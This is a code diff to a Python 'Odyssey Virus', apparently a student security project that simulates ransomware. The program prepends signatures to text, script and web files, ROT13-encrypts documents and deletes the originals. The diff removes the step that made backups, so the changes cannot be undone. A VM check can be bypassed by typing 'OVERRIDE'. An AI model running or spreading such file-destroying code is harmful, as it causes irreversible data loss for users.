@@ -15,6 +15,7 @@ Encryption: ROT13 Algorithm Only
 MODIFICATIONS:
 - Original files are deleted after encryption (realistic simulation)
 - No auto-creation of sample files (user must provide test files)
+- NO BACKUP FILES CREATED - more realistic malware behavior
 - More realistic malware behavior simulation
 - Enhanced encryption process with file replacement
 
@@ -201,7 +202,7 @@ class DocumentProcessor:
             doc.add_heading('Educational Note:', level=1)
             doc.add_paragraph('This document has been encrypted using ROT13 for educational purposes.')
             doc.add_paragraph('ROT13 is a simple Caesar cipher with a shift of 13 positions.')
-            doc.add_paragraph('This is part of a cybersecurity learning exercise.')
+            doc.add_paragraph('This is part of a cybersecurity project .')
             
             # Save document
             doc.save(output_path)
@@ -348,19 +349,20 @@ class SecurityValidator:
 
 BEHAVIORAL CHANGES:
 • Original files will be DELETED after encryption
+• NO BACKUP FILES will be created
 • No automatic sample file creation
 • More realistic malware simulation
 • Files will be permanently replaced with encrypted versions
 
 INSTITUTIONAL CONTEXT:
-• National Teachers College Cybersecurity Exercise
+• National Teachers College Cybersecurity Project
 • Academic Research and Learning Purposes Only
 • Supervised Educational Environment Required
 
 SAFETY CONFIRMATION REQUIRED:
 ✓ I confirm this is for academic purposes only
 ✓ I am running this in a virtual machine environment  
-✓ I understand original files will be deleted
+✓ I understand original files will be deleted with NO BACKUPS
 ✓ I have backed up important files outside the target directory
 ✓ I will not distribute or misuse this program
 ✓ I accept responsibility for ethical usage
@@ -371,7 +373,7 @@ TECHNICAL IMPLEMENTATION:
 • Realistic malware behavior simulation
 • Antivirus development and testing framework
 
-Do you provide consent to proceed with this educational exercise?
+Do you provide consent to proceed with this educational project?
             """
             
             result = messagebox.askyesno("Educational Consent - Odyssey Virus", consent_message)
@@ -380,7 +382,7 @@ Do you provide consent to proceed with this educational exercise?
             
         except Exception as e:
             print(consent_message)
-            response = input("\nType 'CONSENT' to proceed with educational exercise: ").strip().upper()
+            response = input("\nType 'CONSENT' to proceed with educational project: ").strip().upper()
             return response == 'CONSENT'
 
 class OdysseyVirus:
@@ -391,7 +393,7 @@ class OdysseyVirus:
         
         # Virus identification and signature
         self.virus_signature = "ODYSSEY_VIRUS_2025_NTC"
-        self.virus_version = "2.1_EDUCATIONAL"
+        self.virus_version = "2.2_NO_BACKUP_EDUCATIONAL"
         self.institution = "National Teachers College"
         
         # Cryptographic and document processing engines
@@ -417,7 +419,7 @@ class OdysseyVirus:
         # Educational messages (encrypted with ROT13)
         self.encrypted_educational_messages = [
             "Zbqvsvrq Bqlffrk Rqhpngvbany Ivehhf - Svyr Ercynprzrag Fvzhyngvba",
-            "EBG13 Rapekcgvba jvgu Bevtvany Svyr Qryrgvba",
+            "EBG13 Rapekcgvba jvgu Bevtvany Svyr Qryrgvba - Ab Onpxhcf",
             "Natgvbany Grnpuref Pbyyrtr - Ernyvfgvp Znyjner Orunjvbe Fghql"
         ]
         
@@ -455,6 +457,7 @@ Encryption Algorithm: ROT13
 Target Environment: {self.target_directory}
 Supported Documents: {', '.join(self.supported_extensions)}
 Behavior: Original files will be deleted after encryption
+Backup Files: NONE CREATED - More realistic malware simulation
 ═══════════════════════════════════════════════════════════════════
 
 """
@@ -516,7 +519,7 @@ Behavior: Original files will be deleted after encryption
         self.log_activity("Target environment setup completed")
     
     def infect_file(self, file_path):
-        """Inject virus signatures into files without encrypting them"""
+        """Inject virus signatures into files without encrypting them (NO BACKUP CREATED)"""
         try:
             filename = os.path.basename(file_path)
             file_extension = os.path.splitext(file_path)[1].lower()
@@ -529,26 +532,19 @@ Behavior: Original files will be deleted after encryption
             if self.virus_signature in original_content:
                 return False, "File already infected"
             
-            # Create backup filename
-            backup_path = file_path + ".backup"
-            
-            # Create backup of original
-            with open(backup_path, 'w', encoding='utf-8') as f:
-                f.write(original_content)
-            
             # Prepare infection payload based on file type
             infected_content = self.prepare_infection_payload(original_content, file_extension)
             
             if infected_content is None:
                 return False, "File type not suitable for infection"
             
-            # Write infected content back to original file
+            # Write infected content directly to original file (NO BACKUP)
             with open(file_path, 'w', encoding='utf-8') as f:
                 f.write(infected_content)
             
             self.files_infected += 1
             self.infection_operations += 1
-            self.log_activity(f"INFECTED file: {filename}", "CRYPTO")
+            self.log_activity(f"INFECTED file: {filename} (NO BACKUP CREATED)", "CRYPTO")
             
             return True, None
             
@@ -563,11 +559,12 @@ Behavior: Original files will be deleted after encryption
             # Text file infection
             infected_content = f"{self.infection_signatures[0]}\n"
             infected_content += f"<!-- Infection Time: {infection_timestamp} -->\n"
-            infected_content += f"<!-- Educational Virus Injection -->\n\n"
+            infected_content += f"<!-- Educational Virus Injection - NO BACKUP CREATED -->\n\n"
             infected_content += original_content
             infected_content += f"\n\n{self.infection_signatures[4]}"
             infected_content += f"\nInfection performed for educational cybersecurity research"
             infected_content += f"\nNational Teachers College - Security Analysis Project"
+            infected_content += f"\nNO BACKUP FILE WAS CREATED"
             return infected_content
             
         elif file_extension in ['.py', '.js']:
@@ -575,7 +572,8 @@ Behavior: Original files will be deleted after encryption
             infected_content = f"{self.infection_signatures[1]}\n"
             infected_content += f"# Infection Time: {infection_timestamp}\n"
             infected_content += f"# Educational Purpose: Malware Behavior Simulation\n"
-            infected_content += f"# Institution: National Teachers College\n\n"
+            infected_content += f"# Institution: National Teachers College\n"
+            infected_content += f"# NO BACKUP FILE CREATED\n\n"
             infected_content += original_content
             infected_content += f"\n\n{self.infection_signatures[3]}"
             infected_content += f"\n# Educational virus injection completed"
@@ -585,7 +583,7 @@ Behavior: Original files will be deleted after encryption
             # Web file infection
             infected_content = f"{self.infection_signatures[2]}\n"
             infected_content += f"/* Infection Time: {infection_timestamp} */\n"
-            infected_content += f"/* Educational Malware Simulation */\n\n"
+            infected_content += f"/* Educational Malware Simulation - NO BACKUP */\n\n"
             infected_content += original_content
             infected_content += f"\n\n<!-- {self.virus_signature} INFECTION END -->"
             return infected_content
@@ -596,7 +594,7 @@ Behavior: Original files will be deleted after encryption
             infected_lines = [f"# {self.infection_signatures[1]}"]
             infected_lines.extend(lines)
             infected_lines.append(f"# Infected: {infection_timestamp}")
-            infected_lines.append(f"# Educational Purpose Only")
+            infected_lines.append(f"# Educational Purpose Only - NO BACKUP")
             return '\n'.join(infected_lines)
             
         else:
@@ -607,8 +605,8 @@ Behavior: Original files will be deleted after encryption
             return infected_content
     
     def perform_file_infection(self):
-        """Perform file infection on suitable files"""
-        self.log_activity("Initiating file infection process", "CRYPTO")
+        """Perform file infection on suitable files (NO BACKUPS CREATED)"""
+        self.log_activity("Initiating file infection process (NO BACKUP FILES)", "CRYPTO")
         
         if not os.path.exists(self.target_directory):
             self.setup_target_environment()
@@ -646,11 +644,11 @@ Behavior: Original files will be deleted after encryption
                     "infection_timestamp": datetime.now().isoformat(),
                     "virus_signature": self.virus_signature,
                     "infection_type": "content_injection",
-                    "backup_created": True,
-                    "backup_filename": filename + ".backup"
+                    "backup_created": False,
+                    "backup_filename": None
                 }
                 infected_files.append(filename)
-                self.log_activity(f"Successfully infected: {filename}", "CRYPTO")
+                self.log_activity(f"Successfully infected: {filename} (NO BACKUP)", "CRYPTO")
             elif error:
                 self.log_activity(f"Failed to infect {filename}: {error}", "WARNING")
         
@@ -660,7 +658,7 @@ Behavior: Original files will be deleted after encryption
             with open(infection_manifest_path, 'w', encoding='utf-8') as f:
                 json.dump(infection_manifest, f, indent=2)
             
-            self.log_activity(f"Infection manifest saved: {len(infected_files)} files infected", "CRYPTO")
+            self.log_activity(f"Infection manifest saved: {len(infected_files)} files infected (NO BACKUPS)", "CRYPTO")
         
         self.log_activity(f"File infection completed: {len(infected_files)} files infected")
         return len(infected_files)
@@ -748,10 +746,10 @@ Behavior: Original files will be deleted after encryption
                         f.write(f"\n<!-- Document Type: {extension} -->")
                         f.write(f"\n<!-- Timestamp: {datetime.now().isoformat()} -->")
                 
-                # **CRITICAL CHANGE: Delete the original file after successful encryption**
+                # Delete the original file after successful encryption**
                 try:
                     os.remove(file_path)
-                    self.log_activity(f"DELETED original file: {filename}", "DELETE")
+                    self.log_activity(f"DELETED original file: {filename} (NO BACKUP EXISTS)", "DELETE")
                     self.files_replaced += 1
                 except Exception as delete_error:
                     self.log_activity(f"Failed to delete original file {filename}: {str(delete_error)}", "ERROR")
@@ -775,7 +773,8 @@ Behavior: Original files will be deleted after encryption
                     "virus_signature": self.virus_signature,
                     "text_length": len(text_content),
                     "encrypted_length": len(encrypted_content),
-                    "original_file_deleted": True
+                    "original_file_deleted": True,
+                    "backup_file_created": False
                 }
                 
                 # Update statistics
@@ -839,6 +838,7 @@ DECRYPTED: {decrypted_message}
 
 BEHAVIORAL CHANGES:
 • Original files are now DELETED after encryption
+• NO BACKUP FILES are created
 • Files are permanently replaced with encrypted versions
 • No automatic sample file creation
 • More realistic malware simulation
@@ -852,6 +852,7 @@ MULTI-DOCUMENT SUPPORT:
 
 Educational Purpose: Advanced Cybersecurity Learning & Antivirus Development
 Files Replaced: {self.files_replaced}
+Recovery Challenge: NO BACKUP FILES EXIST
 """
                 
                 messagebox.showinfo(f"Odyssey Message {i}", dialog_content)
@@ -870,6 +871,7 @@ Files Replaced: {self.files_replaced}
                 print(f"ENCRYPTED: {encrypted_message}")
                 print(f"DECRYPTED: {decrypted_message}")
                 print("BEHAVIOR: Original files deleted and replaced")
+                print("BACKUP FILES: NONE CREATED")
                 print(f"Files Replaced: {self.files_replaced}")
                 print("═" * 50)
                 
@@ -892,7 +894,8 @@ Files Replaced: {self.files_replaced}
                 "file_replacement": True,
                 "file_infection": True,
                 "no_sample_creation": True,
-                "realistic_simulation": True
+                "realistic_simulation": True,
+                "backup_files_created": False
             },
             "cryptographic_implementation": {
                 "primary_algorithm": "ROT13",
@@ -919,13 +922,14 @@ Files Replaced: {self.files_replaced}
                 "document_types_processed": self.document_types_processed
             },
             "educational_context": {
-                "project_type": "Advanced Academic Cybersecurity Exercise",
+                "project_type": "Information Assurance and Security Final Project",
                 "learning_objectives": [
                     "File infection with virus signature injection",
                     "Realistic multi-format malware behavior analysis",
                     "ROT13 cryptographic implementation with file replacement", 
                     "Document-aware antivirus development",
-                    "Advanced cybersecurity threat simulation"
+                    "Advanced cybersecurity threat simulation",
+                    "No backup file recovery challenges"
                 ],
                 "safety_measures": [
                     "Virtual machine requirement",
@@ -944,10 +948,11 @@ Files Replaced: {self.files_replaced}
                     "Educational Malware Injection"
                 ],
                 "decryption_algorithm": "ROT13",
-                "removal_strategy": "Decrypt encrypted files, clean infected files, restore content (original files deleted)",
+                "removal_strategy": "Decrypt encrypted files, clean infected files, restore content (NO BACKUP FILES EXIST)",
                 "document_processing": "Handle multiple document formats, note that originals are gone",
-                "infection_cleaning": "Remove virus signatures from infected files, restore from backups if available",
-                "recovery_limitation": "Original files deleted - can only recover decrypted content and clean infections"
+                "infection_cleaning": "Remove virus signatures from infected files (NO BACKUP FILES TO RESTORE FROM)",
+                "recovery_limitation": "Original files deleted - can only recover decrypted content and clean infections",
+                "backup_status": "NO BACKUP FILES CREATED - antivirus must recreate files from encrypted content"
             }
         }
         
@@ -959,7 +964,7 @@ Files Replaced: {self.files_replaced}
             f.write(encrypted_payload)
             f.write(f"\n\n<!-- {self.virus_signature} -->")
             f.write(f"\n<!-- Payload encrypted with ROT13 -->")
-            f.write(f"\n<!-- File Replacement -->")
+            f.write(f"\n<!-- File Replacement - NO BACKUPS -->")
         
         self.log_activity(f"Encrypted payload generated: {self.payload_file}", "CRYPTO")
     
@@ -1007,7 +1012,7 @@ Files Replaced: {self.files_replaced}
                 "virus_version": self.virus_version,
                 "infection_timestamp": self.execution_start_time.isoformat(),
                 "execution_duration_seconds": execution_duration.total_seconds(),
-                "behavioral_modification": "File replacement simulation"
+                "behavioral_modification": "File replacement simulation - NO BACKUPS"
             },
             "system_information": {
                 "platform": platform.platform(),
@@ -1035,11 +1040,12 @@ Files Replaced: {self.files_replaced}
                 "file_replacement": True,
                 "file_infection": True,
                 "sample_file_creation": False,
-                "realistic_malware_simulation": True
+                "realistic_malware_simulation": True,
+                "backup_files_created": False
             },
             "educational_context": {
                 "institution": self.institution,
-                "project_type": "ROT13 Multi-Document Demonstration with File Replacement",
+                "project_type": "ROT13 Multi-Document Demonstration with File Replacement - NO BACKUPS",
                 "safety_verified": True
             },
             "antivirus_guidance": {
@@ -1049,7 +1055,8 @@ Files Replaced: {self.files_replaced}
                 "payload_location": self.payload_file,
                 "manifest_location": self.encryption_log_file,
                 "document_processing_required": True,
-                "recovery_limitation": "Original files deleted - can only create recovered versions"
+                "recovery_limitation": "Original files deleted - NO BACKUP FILES - can only create recovered versions",
+                "backup_status": "NO_BACKUP_FILES_CREATED"
             }
         }
         
@@ -1063,6 +1070,7 @@ Files Replaced: {self.files_replaced}
         """Main execution routine for educational virus simulation"""
         print("👿 ODYSSEY VIRUS - EXECUTION STARTING")
         print("🗑️  WARNING: Original files will be DELETED and replaced with encrypted versions")
+        print("❌ NO BACKUP FILES will be created")
         print("📄 Multi-Document Support: Word, PDF, Excel, PowerPoint")
         print("═" * 60)
         
@@ -1079,7 +1087,7 @@ Files Replaced: {self.files_replaced}
             if not SecurityValidator.detect_virtual_environment():
                 self.log_activity("Virtual environment not detected", "WARNING")
                 print("⚠️  WARNING: Virtual machine environment not detected!")
-                print("⚠️  WARNING: Original files will be DELETED!")
+                print("⚠️  WARNING: Original files will be DELETED with NO BACKUPS!")
                 
                 override_response = input("Type 'OVERRIDE' to continue: ").strip()
                 if override_response != 'OVERRIDE':
@@ -1090,6 +1098,7 @@ Files Replaced: {self.files_replaced}
             self.log_activity("Safety verification completed successfully")
             print("✅ Safety verification passed. Beginning simulation...")
             print("🗑️  NOTE: Original files will be permanently replaced with encrypted versions")
+            print("❌ NOTE: NO BACKUP FILES will be created")
             print()
             
             # Display available document processing capabilities
@@ -1105,7 +1114,7 @@ Files Replaced: {self.files_replaced}
             print("📁 Phase 1: Target Environment Setup")
             self.setup_target_environment()
             
-            print("\n🦠 Phase 2: File Infection Process")
+            print("\n🦠 Phase 2: File Infection Process (NO BACKUPS)")
             infected_count = self.perform_file_infection()
             
             print("\n🔐 Phase 3: Multi-Format File Encryption & Replacement")
@@ -1122,7 +1131,6 @@ Files Replaced: {self.files_replaced}
             
             print("\n🎯 Phase 7: Infection Marker")
             self.create_infection_marker()
-            self.create_infection_marker()
             
             # Execution summary
             execution_duration = datetime.now() - self.execution_start_time
@@ -1138,6 +1146,7 @@ Files Replaced: {self.files_replaced}
             print(f"   • Infection operations: {self.infection_operations}")
             print(f"   • Document types: {len(self.document_types_processed)}")
             print(f"   • Target directory: {self.target_directory}")
+            print(f"   • Backup files created: 0 (NONE)")
             
             if self.document_types_processed:
                 print(f"📄 Document Types Processed:")
@@ -1156,6 +1165,7 @@ Files Replaced: {self.files_replaced}
             print("   ✓ ROT13 encryption across document types")
             print("   ✓ Advanced malware behavior simulation")
             print("   ✓ Original file deletion simulation")
+            print("   ✓ NO BACKUP FILE creation - maximum recovery challenge")
             print("   ✓ Antivirus detection and recovery challenges")
             print("   ✓ Comprehensive logging and reporting")
             
@@ -1181,11 +1191,13 @@ def main():
     print()
     print("⚠️  EDUCATIONAL PURPOSE ONLY")
     print("⚠️  WARNING: ORIGINAL FILES WILL BE DELETED")
+    print("❌ WARNING: NO BACKUP FILES WILL BE CREATED")
     print("Must be executed in virtual machine environment")
     print("For academic cybersecurity learning and research")
     print()
     print("📄 BEHAVIORAL CHANGES:")
     print("   • Original files are deleted after encryption")
+    print("   • NO backup files are created")
     print("   • No automatic sample file creation")
     print("   • Files are permanently replaced with encrypted versions")
     print("   • More realistic malware behavior simulation")
@@ -1221,6 +1233,7 @@ def main():
     print("   2. Place your test files in that directory")
     print("   3. Run this virus to encrypt and replace those files")
     print("   4. Use your antivirus to detect and recover the files")
+    print("   5. NO BACKUP FILES will exist - antivirus must recreate files")
     print()
     
     try:
@@ -1233,6 +1246,7 @@ def main():
             print("   • Multiple document formats")
             print("   • ROT13 decryption")
             print("   • File recovery (originals are deleted)")
+            print("   • NO BACKUP FILES exist - must recreate from encrypted content")
             print("   • Encrypted file detection and processing")
         else:
             print("\n📚 Review safety requirements and try again in proper environment.")
